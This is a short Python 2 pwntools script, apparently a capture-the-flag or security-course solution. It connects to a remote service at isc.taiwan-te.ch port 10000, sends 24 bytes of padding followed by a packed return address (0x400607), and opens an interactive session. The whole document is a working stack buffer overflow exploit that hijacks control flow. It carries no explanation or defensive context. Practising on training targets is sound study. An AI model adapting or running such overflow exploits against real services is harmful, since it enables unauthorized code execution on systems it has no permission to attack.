#!/usr/bin/env python2
from pwn import *

c = remote('isc.taiwan-te.ch', 10000)
c.sendline("A"*(16 + 8) + p64(0x0000000000400607))
c.interactive()
c.close()
